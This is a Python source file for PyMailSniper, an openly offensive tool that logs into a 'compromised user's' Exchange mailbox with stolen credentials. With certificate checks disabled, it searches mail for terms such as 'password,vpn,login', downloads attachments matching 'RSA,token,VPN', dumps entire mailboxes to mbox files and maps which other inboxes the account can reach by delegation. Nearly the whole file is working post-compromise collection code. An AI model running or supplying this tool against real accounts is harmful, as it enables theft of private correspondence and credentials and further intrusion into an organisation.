#!/usr/bin/env python3
import re
from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
    NoVerifyHTTPAdapter
from exchangelib.errors import UnauthorizedError, CASError
import mailbox
import requests
import argparse
import sys
import logging
import os
from os.path import isfile
import urllib3
import tqdm

# ignore certificate errors and suspend warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter


def loggerCreate(params):
    logger = logging.getLogger('pymailsniper')
    logger.setLevel(logging.DEBUG)

    # Output response to a File
    filename = logging.FileHandler(params.get("output"))
    filename.setLevel(logging.DEBUG)
    logger.addHandler(filename)

    # Output response to Screen
    screenOutput = logging.StreamHandler(sys.stdout)
    screenOutput.setLevel(logging.DEBUG)
    logger.addHandler(screenOutput)

    return logger


# Function to setup an Exchangelib Account object to be used throughout the code
def acctSetup(params):
    server = params.get('server')
    email = params.get('email')
    password = params.get('password')
    shared = params.get('delegated')

    try:
        config = Configuration(
            server=server, credentials=Credentials(email, password))

        if params.get('delegated'):
            account = Account(primary_smtp_address=shared,
                              autodiscover=False, config=config, access_type=DELEGATE)
        else:
            account = Account(primary_smtp_address=email,
                              autodiscover=False, config=config, access_type=DELEGATE)

        return account
    except Exception as e:
        print(e)


# List folders from a users inbox
def print_folders(accountObject, tree_view=False, count=False, root=False):
    root_folder = accountObject.root if root else accountObject.msg_folder_root
    # 'Top of Information Store'

    print('[+] Folder List for Compromised Users' + '\n')

    if tree_view and not count:
        print(root_folder.tree())
        print("\n[=] Done\n")
        return
    elif tree_view and count:
        tree = root_folder.tree()  # .split("\n")
    if tree_view and count:
        for folder_object in root_folder.walk():
            folder_childs = f' (folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'
            # tree = tree.replace(folder_object.name + "\n", "{:50s} {}\n".format(folder_object.name, folder_childs))
            regex = f"(?<=(\n)).*({folder_object.name.replace('?', '.')})\n"

            try:
                result = re.search(regex, tree).group(0)
                tree = tree.replace(result, "{:50s} {}\n".format(result[:-1], folder_childs))
            except Exception as e:
                pass

        print(tree)
        print("\n[=] Done\n")
        return

    if not tree_view:
        for folder_object in root_folder.walk():
            info_to_print = ""

            if count:
                folder_childs = f'(folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'

            info_to_print += folder_object.absolute
            print("{:28s} {}".format(folder_childs, info_to_print))
        print("\n[=] Done\n")


# Search users email for specified terms
def searchEmail(accountObject, params, loghandle):
    folder = params.get("folder")  # по умолчанию Inbox почему-то
    terms = params.get("terms")
    count = params.get("count")
    if len(terms) > 1:
        termList = terms.split(',')
    else:
        termList = terms

    if params.get("delegated"):
        searchFolder = accountObject.inbox
    else:
        # searchFolder = accountObject.root / 'Top of Information Store' / folder
        searchFolder = accountObject.inbox  # root / 'Корневой уровень хранилища'

    if params.get("field") == 'body':
        print(
            '[+] Searching Email body for {} in {} Folder [+]'.format(terms, folder) + '\n')
        for term in termList:
            searchResult = searchFolder.filter(body__contains=term)[:count]
    else:
        print(
            '[+] Searching Email Subject for {} in {} Folder [+]'.format(terms, folder) + '\n')
        for term in termList:
            searchResult = searchFolder.filter(body__contains=term)

    for emails in searchResult:
        # loghandle.debug
        print('''
From: {}
Date: {}
Subject: {}
Body: {}
*************************************************************************************************{}'''.format(
            emails.author.email_address, emails.datetime_received, emails.subject, emails.text_body, '\n'))


# Search for attachments based on search terms provided
def searchAttachments(accountObject, params):
    folder = params.get("folder")
    terms = params.get("terms")
    count = params.get("count")
    if len(terms) > 1:
        termList = terms.split(',')
    else:
        termList = terms

    if params.get("delegated"):
        searchFolder = accountObject.inbox
    else:
        searchFolder = accountObject.root / 'Top of Information Store' / folder
    if params.get("field") == 'body':
        for term in termList:
            searchResult = searchFolder.filter(body__contains=term)[:count]
    else:
        for term in termList:
            searchResult = searchFolder.filter(subject__contains=term)[:count]

    print('[+] Attachment List for Compromised Users with search term {} in {} Folder'.format(terms, folder) + '\n')
    if params.get("directory"):
        print('[+] Saving Attachments [+]')
    for emails in searchResult:
        for attachment in emails.attachments:
            print('From: {} | Subject: {} | Attachment: {}'.format(
                emails.author.email_address, emails.subject, attachment.name))
            if params.get("directory"):
                if isinstance(attachment, FileAttachment):
                    local_path = os.path.join(
                        params.get("directory"), attachment.name)
                    with open(local_path, 'wb') as f, attachment.fp as fp:
                        buffer = fp.read(1024)
                        while buffer:
                            f.write(buffer)
                            buffer = fp.read(1024)
    print('\n' + 'Saved attachment to', params.get("directory"))


# Check where compromised user has delegation rights
def searchDelegates(params, fparser):
    server = params.get('server')
    email = params.get('email')
    password = params.get('password')

    if isinstance(fparser.get("galList"), (str)):
        fname = ''.join(fparser.get("galList"))
        fname = fname.split(' ')
    else:
        fname = fparser.get("galList")

    print('[+] Checking Where Compromised User Has Access' + '\n')

    for shared in fname:
        try:
            config = Configuration(
                server=server, credentials=Credentials(email, password))

            account = Account(primary_smtp_address=shared,
                              autodiscover=False, config=config, access_type=DELEGATE)

            folderInbox = account.inbox
            # print(folderInbox.permission_set)
            for s in folderInbox.permission_set.permissions:
                if s.permission_level != 'None':
                    print('User: {} has {} permissions on {}\'s Inbox'.format(email, s.permission_level, shared))

        except Exception as e:
            if 'The specified object was not found in the store., The process failed to get the correct properties' not in str(
                    e):
                print(e)


# This is where we check if the address list file provided exists
def file_parser(params):
    return_dict = {}

    if isfile(params.get("galList")):
        with open(params.get("galList", "r")) as f:
            userfile_content = f.read().splitlines()
            f.close()
            return_dict['galList'] = userfile_content
    elif isinstance(params.get("galList"), str):
        return_dict['galList'] = params.get("galList")
    else:
        print("GAL File not found!")

    return return_dict


def print_logo():
    logo = '''
  _____       __  __       _ _  _____       _                 
 |  __ \     |  \/  |     (_) |/ ____|     (_)                
 | |__) |   _| \  / | __ _ _| | (___  _ __  _ _ __   ___ _ __ 
 |  ___/ | | | |\/| |/ _` | | |\___ \| '_ \| | '_ \ / _ \ '__|
 | |   | |_| | |  | | (_| | | |____) | | | | | |_) |  __/ |   
 |_|    \__, |_|  |_|\__,_|_|_|_____/|_| |_|_| .__/ \___|_|   
         __/ |                               | |              
        |___/                                |_|              
        
   '''

    print(logo)


def findFolder(accountObject=None, folder_to_find=None):
    for folder in accountObject.msg_folder_root.walk():
        if folder.name.lower() == folder_to_find.lower():
            return folder
    else:
        return None


def sanitaze_file_path(file_path=None):
    return re.sub("[^а-яА-ЯёЁ0-9a-zA-Z\s-]+", " ", file_path)


def dump_to_Mbox(folder_name=None, mbox_file_path=None, messages=[]):
    try:
        mbox = mailbox.mbox(mbox_file_path)
        mbox.lock()
        desc = "[+] Saving folder {} to {}".format('"' + folder_name + '"', mbox_file_path)
        for message_index in tqdm.tqdm(range(len(messages)), desc=desc, leave=False, unit="email"):
            msg = mailbox.mboxMessage(messages[message_index])
            mbox.add(msg)
            mbox.flush()
        mbox.unlock()
    except Exception as e:
        print(f"[-] Error while saving {folder_name} to {mbox_file_path}:")
        print(e)
    finally:
        print("[+] Folder {:30s} dumped to {}".format('"' + folder_name + '"', mbox_file_path))


def get_emails(accountObject=None, items_list=None, folder_name=None):
    messages = []
    items_list = list(items_list)
    # you can try with this parameter for perfomance:
    # bur in my case by one is fastest
    count_per_task = 1
    if folder_name:
        desc = f"[+] Downloading folder \"{folder_name}\""
    else:
        desc = ""
    for i in tqdm.tqdm(range(0, len(items_list), count_per_task), desc=desc, leave=False, unit="email"):
        temp = items_list[i:i + count_per_task]
        for mime in accountObject.fetch(temp):
            messages.append(mime.mime_content)
    # if folder_name:
    #     print(f"[+] Downloaded {folder_name}")
    return messages


def dumper(accountObject=None, folder_to_dump="Inbox", local_folder="dump"):
    # брать папку из аргументов если dump all -d "папка куда"

    base_folder = None

    if folder_to_dump.lower() == "inbox":
        base_folder = accountObject.Inbox
    elif folder_to_dump.lower() == "sent":
        base_folder = accountObject.Sent
    elif folder_to_dump.lower() == "all":
        base_folder = accountObject.msg_folder_root
    else:
        base_folder = findFolder(accountObject=accountObject, folder_to_find=folder_to_dump)
        if not base_folder:
            print(f"\n[-] Folder {local_folder} not found")
            return 1

    if os.path.isdir(local_folder):
        print(f"\n[-] Folder {local_folder} allready exists, use another (-d)")
        return 1
    else:
        try:
            os.mkdir(local_folder)
            print(f"\n[+] Folder {local_folder} created")
        except Exception as e:
            print(f"\n[-] Something went wrong while creating {local_folder}:")
            print(e)
            return 1

    # If messages in folder are present:
    if base_folder.total_count != 0:
        folder_name = sanitaze_file_path(base_folder.name)
        mbox_file_path = f"./{local_folder}/{folder_name}.mbox"

        items = base_folder.all().only('id', 'changekey').order_by('-datetime_received')
        messages = get_emails(accountObject=accountObject, items_list=items, folder_name=base_folder.name)
        dump_to_Mbox(folder_name=base_folder.name, mbox_file_path=mbox_file_path, messages=messages)

    # Walking across subfolders:
    for folder in base_folder.walk():
        # If folder have no messages, go to next folder
        if folder.total_count == 0:
            continue

        mbox_file_path = (folder.absolute).replace(base_folder.absolute + "/", "")
        mbox_file_path = sanitaze_file_path(mbox_file_path)
        mbox_file_path = f"./{local_folder}/{mbox_file_path}.mbox"

        items = folder.all().only('id', 'changekey').order_by('-datetime_received')  # [:10]
        messages = get_emails(accountObject=accountObject, items_list=items, folder_name=folder.name)
        dump_to_Mbox(folder_name=folder.name, mbox_file_path=mbox_file_path, messages=messages)

    print("\n[=] All folders downloaded\n\n")


if __name__ == "__main__":
    # This is where we start parsing arguments
    banner = "# PyMailSniper [http://www.foofus.net] (C) sph1nx Foofus Networks <sph1nx@foofus.net>"
    banner += "\n# Fork By HydroSausager\n"

    print_logo()
    print(banner)
    parser = argparse.ArgumentParser(description='Python implementation of mailsniper',
                                     usage='python3 pymailsniper.py module [options]')

    subparsers = parser.add_subparsers(
        title='Modules', dest='modules', description='available modules')

    optional_parser = argparse.ArgumentParser(add_help=False)
    optional_parser.add_argument('-s', '--remote-server', action="store",
                                 dest="server", help='EWS URL for Mail Server')
    optional_parser.add_argument('-e', '--email', action="store",
                                 dest="email", help='Email address of compromised user')
    optional_parser.add_argument('-p', '--password', action="store",
                                 dest="password", help='Password of compromised user')

    folder_parser = subparsers.add_parser(
        'folders', help="List Mailbox Folders", parents=[optional_parser])
    folder_parser.add_argument('-a', '--absolute', action='store_true', default=False,
                               help='Print folders absolute paths instead tree if arg is present')
    folder_parser.add_argument('-c', '--count', action='store_true', default=False,
                               help='Print count of child folders and email if present')
    folder_parser.add_argument('-r', '--root', action='store_true', default=False,
                               help='Use "root" folder as root for printing insted of "Top Information Store"')

    dump_parser = subparsers.add_parser(
        'dump', help="Download emails", parents=[optional_parser])
    dump_parser.add_argument('folder', action='store', default="Inbox",
                             help='Folder to dump')
    dump_parser.add_argument('-d', '--dump-folder', action='store', default="dump",
                             help='Local folder to store .mbox dumps')

    attach_parser = subparsers.add_parser(
        'attachment', help="List/Download Attachments", parents=[optional_parser])
    attach_parser.add_argument('-d', '--directory', action="store",
                               dest="directory", help='Directory to download attachments', metavar=' ')
    attach_parser.add_argument('-t', '--terms', action="store",
                               dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
                               nargs='+', type=str, default='RSA,token,VPN')
    attach_parser.add_argument('-f', '--folder', action="store",
                               dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
    attach_parser.add_argument('-c', '--count', action="store",
                               dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    attach_parser.add_argument('--field', action="store",
                               dest="field", help='Email field to search. Default is subject',
                               choices=['subject', 'body'])

    delegate_parser = subparsers.add_parser(
        'delegation', help="Find where compromised user has access", parents=[optional_parser])
    delegate_parser.add_argument('-g', '--gal', action="store",
                                 dest="galList", metavar=' ', help='List of email addresses to check access',
                                 required=True)

    email_parser = subparsers.add_parser('emails', help="Search for Emails", parents=[optional_parser])
    email_parser.add_argument('-f', '--folder', action="store", dest="folder", metavar=' ',
                              help='Folder to search through', default='Inbox')
    email_parser.add_argument('-t', '--terms', action="store",
                              dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
                              nargs='+', type=str, default='password,vpn,login')
    email_parser.add_argument('-c', '--count', action="store",
                              dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    email_parser.add_argument('--field', action="store",
                              dest="field", help='Email field to search. Default is subject',
                              choices=['subject', 'body'])
    email_parser.add_argument('--delegated', action="store",
                              dest="delegated", help='Mailbox with access')
    email_parser.add_argument('-o', '--output', action="store",
                              dest="output", metavar=' ', help='Filename to save emails', required=True)

    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    parsed_arguments = vars(args)  # Convert Args to a Dictionary
    if parsed_arguments.get("galList"):
        fileparser = file_parser(parsed_arguments)

    if parsed_arguments.get("output"):
        loghandle = loggerCreate(parsed_arguments)
    accountObj = acctSetup(parsed_arguments)

    if accountObj is None:
        print('[+] Could not connect to MailBox [+]')
        sys.exit()

    print(f"[+] Email - {args.email}, server - {args.server}")

    if parsed_arguments['modules'] == 'folders':
        print_folders(accountObj, tree_view=not args.absolute, count=args.count, root=args.root)
    elif parsed_arguments['modules'] == 'dump':
        dumper(accountObj, folder_to_dump=args.folder, local_folder=args.dump_folder)
    elif parsed_arguments['modules'] == 'emails':
        searchEmail(accountObj, parsed_arguments, loghandle)
    elif parsed_arguments['modules'] == 'attachment':
        searchAttachments(accountObj, parsed_arguments)
    elif parsed_arguments['modules'] == 'delegation':
        searchDelegates(parsed_arguments, fileparser)

# to-do get file sizes
